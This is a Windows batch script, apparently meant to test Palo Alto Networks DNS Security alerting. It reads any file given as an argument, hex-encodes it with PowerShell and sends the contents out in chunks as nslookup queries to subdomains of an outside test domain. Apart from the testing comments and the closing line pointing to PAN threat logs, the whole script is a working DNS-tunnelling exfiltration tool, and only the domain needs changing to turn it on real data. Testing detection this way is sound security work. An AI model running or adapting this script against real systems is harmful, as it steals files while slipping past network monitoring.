@echo off
REM DNS File Exfiltration Test - Based on common malware techniques
REM Uses your controlled domain - replace YOUR-DOMAIN.com

set DOMAIN=test-dnstun.testpanw.com
set FILENAME=%1

if "%FILENAME%"=="" (
    echo Usage: dns_file_exfil.bat "C:\Header & Footer\Header Test 1.docx"
    exit /b 1
)

echo [+] Exfiltrating file: %FILENAME%
echo [+] Target DNS: %DOMAIN%

REM Convert file to hex using PowerShell (simulates malware encoding)
for /f "delims=" %%i in ('powershell -command "([System.IO.File]::ReadAllBytes('%FILENAME%') | ForEach-Object { '{0:x2}' -f $_ }) -join ''"') do set HEX=%%i

echo [+] Encoded length: %HEX:~0,20%... (truncated for display)

REM Split into 30-char chunks and send as DNS queries (simulates real exfil)
setlocal enabledelayedexpansion
set chunk_size=30
set offset=0

:loop
set chunk=!HEX:~%offset%,%chunk_size%!
if "!chunk!"=="" goto :done

set /a chunk_num=offset/chunk_size
echo [>] Query %chunk_num%: !chunk!.%DOMAIN%

REM Send DNS query - this is what triggers PAN DNS Security
nslookup !chunk!.%DOMAIN% >nul 2>&1

set /a offset+=chunk_size
timeout /t 1 /nobreak >nul
goto :loop

:done
echo [+] Exfiltration complete. Check PAN Threat logs for DNS Tunneling alerts.